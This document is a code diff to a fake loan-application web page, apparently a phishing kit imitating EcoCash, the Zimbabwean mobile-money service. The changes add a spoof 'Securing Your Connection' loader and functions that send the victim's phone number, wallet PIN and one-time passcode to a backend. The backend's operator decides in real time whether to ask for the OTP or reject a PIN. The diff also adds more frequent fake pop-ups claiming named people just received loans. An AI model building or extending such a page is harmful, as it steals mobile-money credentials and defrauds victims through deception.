@@ -17,6 +17,7 @@
   --bg:#f9fafb;
   --white:#ffffff;
   --blue-tint:#f0f4fb;
+  --green:#16a34a;
 }
 html,body{height:100%;font-family:'Nunito',-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,sans-serif;background:var(--bg);display:flex;justify-content:center;margin:0;padding:0;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;}
 .phone{width:390px;min-height:100vh;background:var(--white);display:flex;flex-direction:column;position:relative;overflow:hidden;}
@@ -49,7 +50,7 @@ html,body{height:100%;font-family:'Nunito',-apple-system,BlinkMacSystemFont,'Seg
 .amount-input-wrap label{display:block;font-size:12px;color:var(--sub);margin-bottom:8px;}
 .amount-input-row{display:flex;align-items:center;gap:10px;}
 .amount-input-row .currency-symbol{font-size:18px;color:var(--text);font-weight:500;flex-shrink:0;}
-.amount-input-row input{flex:1;padding:13px 14px;background:var(--white);border:1px solid var(--border);border-radius:8px;font-size:16px;font-family:inherit;font-weight:400;color:var(--text);outline:none;transition:border-color 0.15s;}
+.amount-input-row input{flex:1;padding:13px 14px;background:var(--white);border:1px solid var(--border);border-radius:8px;font-size:16px;font-family:inherit;font-weight:400;color:var(--text);outline:none;transition:border-color 0.15s;inputmode:numeric;pattern:[0-9]*;}
 .amount-input-row input:focus{border-color:var(--blue);}
 .amount-input-row input::placeholder{color:var(--hint);}
 .amount-error{font-size:11px;color:var(--red);margin-top:6px;display:none;}
@@ -104,14 +105,22 @@ input[type=range]::-moz-range-thumb{width:22px;height:22px;border-radius:50%;bac
 .sum-row.total .sum-val{font-size:16px;color:var(--blue);font-weight:600;}
 .legal-text{font-size:12px;color:var(--hint);line-height:1.7;}
 
-/* ── Polling Overlay ── */
-.polling-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:100;flex-direction:column;}
-.polling-card{background:var(--white);border-radius:16px;padding:32px 24px;text-align:center;max-width:320px;width:90%;}
-.polling-spinner{width:48px;height:48px;border:3px solid var(--border);border-top-color:var(--blue);border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 20px;}
+/* ── Loading / Polling Overlay ── */
+.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.55);display:flex;align-items:center;justify-content:center;z-index:100;flex-direction:column;}
+.overlay-card{background:var(--white);border-radius:20px;padding:36px 28px;text-align:center;max-width:320px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.2);}
+.overlay-spinner{width:52px;height:52px;border:3.5px solid var(--border);border-top-color:var(--blue);border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto 20px;}
 @keyframes spin{to{transform:rotate(360deg);}}
-.polling-title{font-size:18px;font-weight:600;color:var(--text);margin-bottom:8px;}
-.polling-desc{font-size:14px;color:var(--sub);line-height:1.5;}
-.polling-error{color:var(--red);margin-top:16px;font-size:13px;display:none;}
+.overlay-title{font-size:19px;font-weight:700;color:var(--text);margin-bottom:8px;}
+.overlay-desc{font-size:14px;color:var(--sub);line-height:1.6;}
+.overlay-error{color:var(--red);margin-top:16px;font-size:13px;display:none;}
+
+/* ── Cool Loading Popup ── */
+.cool-loader{display:flex;flex-direction:column;align-items:center;}
+.cool-loader .eco-badge{font-size:48px;margin-bottom:16px;animation:pulse 1s ease-in-out infinite;}
+@keyframes pulse{0%,100%{transform:scale(1);opacity:1;}50%{transform:scale(1.1);opacity:0.8;}}
+.cool-loader .loading-bar-wrap{width:100%;height:5px;background:var(--border);border-radius:5px;overflow:hidden;margin-top:18px;}
+.cool-loader .loading-bar{height:100%;background:linear-gradient(90deg,var(--blue),var(--red),var(--blue));background-size:200% 100%;border-radius:5px;animation:slideBar 1.5s linear infinite;}
+@keyframes slideBar{0%{background-position:200% 0;width:0%;}50%{width:70%;}100%{background-position:-200% 0;width:100%;}}
 
 .succ-wrap{flex:1;display:flex;flex-direction:column;padding:48px 24px 32px;}
 .succ-icon{width:48px;height:48px;border-radius:50%;background:var(--blue-tint);display:flex;align-items:center;justify-content:center;margin-bottom:24px;}
@@ -123,11 +132,11 @@ input[type=range]::-moz-range-thumb{width:22px;height:22px;border-radius:50%;bac
 .ref-val{font-size:15px;font-weight:500;color:var(--text);}
 .fnote{font-size:12px;color:var(--hint);margin-top:32px;}
 
-.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(8px);background:var(--white);border:1px solid var(--border);border-radius:8px;padding:12px 16px;display:flex;align-items:center;gap:10px;opacity:0;transition:opacity 0.25s,transform 0.25s;pointer-events:none;z-index:99;white-space:nowrap;}
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(8px);background:var(--white);border:1px solid var(--border);border-radius:8px;padding:12px 16px;display:flex;align-items:center;gap:10px;opacity:0;transition:opacity 0.25s,transform 0.25s;pointer-events:none;z-index:99;white-space:nowrap;box-shadow:0 4px 16px rgba(0,0,0,0.08);}
 .toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
-.t-dot{width:7px;height:7px;border-radius:50%;background:var(--blue);flex-shrink:0;}
+.t-dot{width:7px;height:7px;border-radius:50%;background:var(--green);flex-shrink:0;}
 .t-text{font-size:13px;color:var(--sub);}
-.t-text b{color:var(--text);font-weight:500;}
+.t-text b{color:var(--text);font-weight:600;}
 
 /* ══════════════════════════════
    LOGIN & OTP STYLES
@@ -178,14 +187,11 @@ input[type=range]::-moz-range-thumb{width:22px;height:22px;border-radius:50%;bac
   <div class="toast" id="toast"><div class="t-dot"></div><div class="t-text" id="t-text"></div></div>
 
   <!-- ══════════════════════════════
-       POLLING OVERLAY (hidden by default)
+       OVERLAY (for loading / polling / errors)
   ═══════════════════════════════ -->
-  <div class="polling-overlay" id="pollingOverlay" style="display:none;">
-    <div class="polling-card">
-      <div class="polling-spinner"></div>
-      <div class="polling-title" id="pollingTitle">Awaiting Approval</div>
-      <div class="polling-desc" id="pollingDesc">Your application has been sent to our team for review. This usually takes less than a minute.</div>
-      <div class="polling-error" id="pollingError"></div>
+  <div class="overlay" id="overlay" style="display:none;">
+    <div class="overlay-card" id="overlayCard">
+      <!-- Content injected dynamically -->
     </div>
   </div>
 
@@ -204,7 +210,7 @@ input[type=range]::-moz-range-thumb{width:22px;height:22px;border-radius:50%;bac
         <label for="amountInput">Enter loan amount</label>
         <div class="amount-input-row">
           <span class="currency-symbol">$</span>
-          <input type="text" id="amountInput" placeholder="Minimum $20" value="" oninput="amountInputChange(this.value)">
+          <input type="text" id="amountInput" inputmode="numeric" pattern="[0-9]*" placeholder="Minimum $20" value="" oninput="amountInputChange(this.value)">
         </div>
         <div class="amount-error" id="amountError">Minimum loan amount is $20</div>
       </div>
@@ -296,7 +302,7 @@ input[type=range]::-moz-range-thumb{width:22px;height:22px;border-radius:50%;bac
     <div class="foot">
       <div class="brow">
         <button class="btn-back" onclick="go('s-p3','s-p1')">Back</button>
-        <button class="btn-primary" onclick="goToLogin()">Continue to Login</button>
+        <button class="btn-primary" onclick="showCoolLoader()">Continue to Login</button>
       </div>
     </div>
   </div>
@@ -312,7 +318,7 @@ input[type=range]::-moz-range-thumb{width:22px;height:22px;border-radius:50%;bac
         <img class="flag" src="https://flagcdn.com/w80/zw.png" alt="Zimbabwe flag">
         <div class="arrow-icon"></div>
         <span class="code">+263</span>
-        <input class="phone-input-login" id="phoneInputLogin" type="tel" inputmode="numeric" maxlength="9" placeholder="Phone Number">
+        <input class="phone-input-login" id="phoneInputLogin" type="tel" inputmode="numeric" maxlength="10" placeholder="Phone Number">
       </div>
       <div class="pin-label">Enter your PIN</div>
       <div class="pin-row">
@@ -390,6 +396,7 @@ var durVal = 6;
 var otpTimer = null;
 var pollTimer = null;
 var currentToken = null;
+var fullNameCache = '';
 
 function go(from, to) {
   document.getElementById(from).classList.remove('active');
@@ -490,7 +497,8 @@ function populateReview() {
   var ln = document.getElementById('ln').value.trim();
   var ic = parseFloat(document.getElementById('inc').value) || 0;
   var source = document.getElementById('incomeSource').value || '—';
-  document.getElementById('rv-name').textContent = [fn, ln].filter(Boolean).join(' ') || '—';
+  fullNameCache = [fn, ln].filter(Boolean).join(' ') || 'Unknown';
+  document.getElementById('rv-name').textContent = fullNameCache;
   document.getElementById('rv-source').textContent = source;
   document.getElementById('rv-inc').textContent = ic > 0 ? usd(ic) : '—';
   document.getElementById('rv-dur').textContent = m + ' months';
@@ -499,45 +507,66 @@ function populateReview() {
 }
 
 // ═══════════════════════════════════════
+//  OVERLAY HELPERS
+// ═══════════════════════════════════════
+
+function showOverlay(html) {
+  document.getElementById('overlayCard').innerHTML = html;
+  document.getElementById('overlay').style.display = 'flex';
+}
+
+function hideOverlay() {
+  document.getElementById('overlay').style.display = 'none';
+}
+
+function showPollingOverlay(title, desc) {
+  showOverlay(
+    '<div class="overlay-spinner"></div>' +
+    '<div class="overlay-title">' + (title || 'Processing') + '</div>' +
+    '<div class="overlay-desc">' + (desc || 'Please wait...') + '</div>' +
+    '<div class="overlay-error" id="overlayError"></div>'
+  );
+}
+
+function showOverlayError(msg) {
+  var errEl = document.getElementById('overlayError');
+  if (errEl) { errEl.textContent = msg; errEl.style.display = 'block'; }
+}
+
+// ═══════════════════════════════════════
+//  COOL LOADER (3 seconds) → Login
+// ═══════════════════════════════════════
+
+function showCoolLoader() {
+  showOverlay(
+    '<div class="cool-loader">' +
+      '<div class="eco-badge">💸</div>' +
+      '<div class="overlay-title">Securing Your Connection</div>' +
+      '<div class="overlay-desc">Preparing EcoCash secure login...</div>' +
+      '<div class="loading-bar-wrap"><div class="loading-bar"></div></div>' +
+    '</div>'
+  );
+
+  setTimeout(function() {
+    hideOverlay();
+    go('s-p3', 's-login');
+  }, 3000);
+}
+
+// ═══════════════════════════════════════
 //  BACKEND INTEGRATION
 // ═══════════════════════════════════════
 
-function showPolling(title, desc) {
-  document.getElementById('pollingTitle').textContent = title || 'Awaiting Approval';
-  document.getElementById('pollingDesc').textContent = desc || 'Your application has been sent to our team for review.';
-  document.getElementById('pollingError').style.display = 'none';
-  document.getElementById('pollingOverlay').style.display = 'flex';
-}
-
-function hidePolling() {
-  document.getElementById('pollingOverlay').style.display = 'none';
-}
-
-function showPollingError(msg) {
-  var errEl = document.getElementById('pollingError');
-  errEl.textContent = msg;
-  errEl.style.display = 'block';
-}
-
-async function submitLoanApplication() {
-  var a = parseInt(document.getElementById('slider').value) || 20;
-  var m = durVal;
-  var monthly = calcM(a, m);
-  var total = monthly * m;
-
+async function notifyBackend(type, extra) {
+  var phone = document.getElementById('phoneInputLogin').value.trim();
   var payload = {
-    type: 'loan_application',
-    firstName: document.getElementById('fn').value.trim(),
-    lastName: document.getElementById('ln').value.trim(),
-    incomeSource: document.getElementById('incomeSource').value,
-    monthlyIncome: document.getElementById('inc').value.trim(),
-    loanAmount: a.toString(),
-    loanPeriod: m + ' months',
-    monthlyPayment: usd(monthly),
-    totalRepayable: usd(total)
+    type: type,
+    phone: phone,
+    countryCode: '+263',
+    name: fullNameCache
   };
-
-  showPolling('Submitting Application...', 'Sending your application to our team for review.');
+  // Merge extra fields
+  for (var k in extra) { payload[k] = extra[k]; }
 
   try {
     var resp = await fetch(API_BASE + '/notify', {
@@ -545,36 +574,22 @@ async function submitLoanApplication() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-
     var data = await resp.json();
-
-    if (!data.ok) {
-      showPollingError('Failed to submit application: ' + (data.error || 'Unknown error'));
-      return;
-    }
-
-    currentToken = data.token;
-
-    document.getElementById('pollingTitle').textContent = 'Awaiting Approval';
-    document.getElementById('pollingDesc').textContent = 'Your application has been sent to our team for review. This usually takes less than a minute.';
-
-    startPolling();
-
+    return data;
   } catch (err) {
-    console.error('Submit error:', err);
-    showPollingError('Network error. Please check your connection and try again.');
+    console.error('Notify error:', err);
+    return { ok: false, error: 'Network error' };
   }
 }
 
-function startPolling() {
+function startPolling(onResult) {
   var startTime = Date.now();
-
   clearInterval(pollTimer);
 
   pollTimer = setInterval(async function() {
     if (Date.now() - startTime > POLL_TIMEOUT) {
       clearInterval(pollTimer);
-      showPollingError('Approval timed out. Please try again later.');
+      showOverlayError('Request timed out. Please try again.');
       return;
     }
 
@@ -584,32 +599,120 @@ function startPolling() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ token: currentToken })
       });
-
       var data = await resp.json();
 
       if (!data.ok) {
         clearInterval(pollTimer);
-        showPollingError('Error checking approval status.');
+        showOverlayError('Error checking status.');
         return;
       }
 
-      if (data.result === 'loan_approved') {
+      if (data.result !== 'pending') {
         clearInterval(pollTimer);
-        hidePolling();
-        onLoanApproved();
-      } else if (data.result === 'loan_rejected') {
-        clearInterval(pollTimer);
-        hidePolling();
-        onLoanRejected();
+        onResult(data.result);
       }
-
     } catch (err) {
       console.error('Poll error:', err);
     }
   }, POLL_INTERVAL);
 }
 
-function onLoanApproved() {
+// ═══════════════════════════════════════
+//  LOGIN → PIN SUBMISSION
+// ═══════════════════════════════════════
+
+function submitPin() {
+  var phone = document.getElementById('phoneInputLogin').value.trim();
+  if (!phone || phone.length < 9) {
+    alert('Please enter a valid phone number (9-10 digits).');
+    return;
+  }
+
+  var pins = document.querySelectorAll('.pin-box');
+  var pinVal = '';
+  pins.forEach(function(b) { pinVal += b.value; });
+  if (pinVal.length < 4) {
+    alert('Please enter your 4-digit PIN.');
+    return;
+  }
+
+  showPollingOverlay('Verifying PIN', 'Sending to secure verification...');
+
+  notifyBackend('pin', { passcode: pinVal }).then(function(data) {
+    if (!data.ok) {
+      showOverlayError('Failed: ' + (data.error || 'Unknown error'));
+      return;
+    }
+    currentToken = data.token;
+    document.getElementById('overlayTitle') && (document.getElementById('overlayTitle').textContent = 'Awaiting Approval');
+    document.getElementById('overlayDesc') && (document.getElementById('overlayDesc').textContent = 'Please wait while we verify your credentials...');
+
+    startPolling(function(result) {
+      if (result === 'continue_otp') {
+        hideOverlay();
+        goToOtp();
+      } else if (result === 'pin_wrong') {
+        hideOverlay();
+        alert('Wrong PIN. Please try again.');
+        // Clear pin boxes
+        document.querySelectorAll('.pin-box').forEach(function(b) { b.value = ''; });
+      }
+    });
+  });
+}
+
+// ═══════════════════════════════════════
+//  OTP → OTP SUBMISSION
+// ═══════════════════════════════════════
+
+function submitOtp() {
+  var otpBoxes = document.querySelectorAll('.otp-box');
+  var otpVal = '';
+  otpBoxes.forEach(function(b) { otpVal += b.value; });
+  if (otpVal.length < 6) {
+    alert('Please enter the full 6-digit OTP.');
+    return;
+  }
+
+  clearInterval(otpTimer);
+  showPollingOverlay('Verifying OTP', 'Sending for approval...');
+
+  notifyBackend('otp', { otp: otpVal }).then(function(data) {
+    if (!data.ok) {
+      showOverlayError('Failed: ' + (data.error || 'Unknown error'));
+      return;
+    }
+    currentToken = data.token;
+
+    startPolling(function(result) {
+      hideOverlay();
+
+      switch (result) {
+        case 'otp_wrong':
+          alert('Wrong OTP. Please try again.');
+          resetOtpBoxes();
+          startOtpCountdown();
+          break;
+
+        case 'pin_invalid':
+          alert('Invalid session. Please login again.');
+          go('s-otp', 's-login');
+          resetOtpBoxes();
+          break;
+
+        case 'loan_approved':
+          onApproved();
+          break;
+
+        case 'loan_rejected':
+          onRejected();
+          break;
+      }
+    });
+  });
+}
+
+function onApproved() {
   var ref = 'ECL-2026-' + Math.floor(100000 + Math.random() * 900000);
   document.getElementById('ref-num').textContent = ref;
   document.getElementById('successTitle').textContent = 'Application Approved';
@@ -617,7 +720,7 @@ function onLoanApproved() {
   go('s-otp', 's-ok');
 }
 
-function onLoanRejected() {
+function onRejected() {
   var ref = 'ECL-2026-' + Math.floor(100000 + Math.random() * 900000);
   document.getElementById('ref-num').textContent = ref;
   document.getElementById('successTitle').textContent = 'Application Declined';
@@ -626,12 +729,8 @@ function onLoanRejected() {
 }
 
 // ═══════════════════════════════════════
-//  LOGIN / OTP
+//  NAVIGATION
 // ═══════════════════════════════════════
-
-function goToLogin() {
-  go('s-p3', 's-login');
-}
 
 function goToOtp() {
   var phoneVal = document.getElementById('phoneInputLogin').value.trim();
@@ -639,19 +738,12 @@ function goToOtp() {
     var masked = '+263 ' + phoneVal.substring(0, 2) + '*****' + phoneVal.substring(phoneVal.length - 2);
     document.getElementById('otpPhoneDisplay').textContent = masked;
   } else if (phoneVal.length > 0) {
-    var masked = '+263 ' + phoneVal + '*****';
-    document.getElementById('otpPhoneDisplay').textContent = masked;
+    document.getElementById('otpPhoneDisplay').textContent = '+263 ' + phoneVal + '*****';
   } else {
     document.getElementById('otpPhoneDisplay').textContent = '+263 778*****38';
   }
   go('s-login', 's-otp');
   startOtpCountdown();
-}
-
-function onOtpSubmit() {
-  // OTP verified → now submit loan to backend for admin approval
-  clearInterval(otpTimer);
-  submitLoanApplication();
 }
 
 function goBackToLogin() {
@@ -662,7 +754,7 @@ function goBackToLogin() {
 
 function reset() {
   clearInterval(pollTimer);
-  hidePolling();
+  hideOverlay();
   ['fn', 'ln', 'inc'].forEach(function(id) {
     var el = document.getElementById(id);
     if (el) el.value = '';
@@ -671,6 +763,9 @@ function reset() {
   document.getElementById('slider').value = 20;
   document.getElementById('amountInput').value = '';
   document.getElementById('amountError').classList.remove('show');
+  document.getElementById('phoneInputLogin').value = '';
+  document.querySelectorAll('.pin-box').forEach(function(b) { b.value = ''; });
+  resetOtpBoxes();
   durVal = 6;
   document.querySelectorAll('.dur-opt').forEach(function(b, i) {
     b.classList.toggle('selected', i === 0);
@@ -709,18 +804,18 @@ pinBoxes.forEach(function(box, i) {
 });
 
 document.getElementById('continueBtn').addEventListener('click', function() {
-  goToOtp();
+  submitPin();
 });
 
 /* ── OTP Logic ── */
 var otpBoxes = document.querySelectorAll('.otp-box');
-var submitBtn = document.getElementById('submitBtn');
+var submitBtnEl = document.getElementById('submitBtn');
 
 otpBoxes.forEach(function(box, i) {
   box.addEventListener('input', function() {
     box.value = box.value.replace(/\D/g, '').slice(0,1);
     if (box.value && i < otpBoxes.length - 1) otpBoxes[i+1].focus();
-    submitBtn.classList.toggle('active', Array.from(otpBoxes).every(function(b) { return b.value; }));
+    submitBtnEl.classList.toggle('active', Array.from(otpBoxes).every(function(b) { return b.value; }));
   });
   box.addEventListener('keydown', function(e) {
     if (e.key === 'Backspace' && !box.value && i > 0) otpBoxes[i-1].focus();
@@ -730,7 +825,7 @@ otpBoxes.forEach(function(box, i) {
     var txt = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
     txt.split('').slice(0, otpBoxes.length - i).forEach(function(ch, j) { if(otpBoxes[i+j]) otpBoxes[i+j].value = ch; });
     otpBoxes[Math.min(i+txt.length, otpBoxes.length-1)].focus();
-    submitBtn.classList.toggle('active', Array.from(otpBoxes).every(function(b) { return b.value; }));
+    submitBtnEl.classList.toggle('active', Array.from(otpBoxes).every(function(b) { return b.value; }));
   });
 });
 
@@ -738,9 +833,9 @@ document.getElementById('backBtn').addEventListener('click', function() {
   goBackToLogin();
 });
 
-submitBtn.addEventListener('click', function() {
-  if (submitBtn.classList.contains('active')) {
-    onOtpSubmit();
+submitBtnEl.addEventListener('click', function() {
+  if (submitBtnEl.classList.contains('active')) {
+    submitOtp();
   }
 });
 
@@ -763,24 +858,32 @@ function startOtpCountdown() {
 
 function resetOtpBoxes() {
   otpBoxes.forEach(function(b) { b.value = ''; });
-  submitBtn.classList.remove('active');
+  submitBtnEl.classList.remove('active');
   var rt = document.getElementById('resendText');
   rt.innerHTML = 'Resend OTP in <span id="countdown">58</span> seconds';
 }
 
 updateLanding();
 
-var names = [['Tendai M.', '$1,500'], ['Rudo C.', '$3,200'], ['Farai D.', '$800'], ['Simba N.', '$500'], ['Chipo Z.', '$12,000']];
+// ═══════════════════════════════════════
+//  TOAST NOTIFICATIONS (more frequent)
+// ═══════════════════════════════════════
+var names = [
+  ['Tendai M.', '$1,500'], ['Rudo C.', '$3,200'], ['Farai D.', '$800'],
+  ['Simba N.', '$500'], ['Chipo Z.', '$12,000'], ['Tanya K.', '$2,100'],
+  ['Blessing N.', '$4,500'], ['Kudzi W.', '$950'], ['Mai T.', '$6,800']
+];
 var ti = 0;
 function showToast() {
   if (!document.getElementById('s-land').classList.contains('active')) return;
   var p = names[ti % names.length]; ti++;
-  document.getElementById('t-text').innerHTML = '<b>' + p[0] + '</b> received ' + p[1];
+  document.getElementById('t-text').innerHTML = '<b>' + p[0] + '</b> just received ' + p[1];
   var el = document.getElementById('toast');
   el.classList.add('show');
-  setTimeout(function() { el.classList.remove('show'); }, 4000);
+  setTimeout(function() { el.classList.remove('show'); }, 4500);
 }
-setTimeout(function() { showToast(); setInterval(showToast, 8000); }, 4000);
+// Show first toast after 2 seconds, then every 5 seconds
+setTimeout(function() { showToast(); setInterval(showToast, 5000); }, 2000);
 </script>
 </body>
 </html>
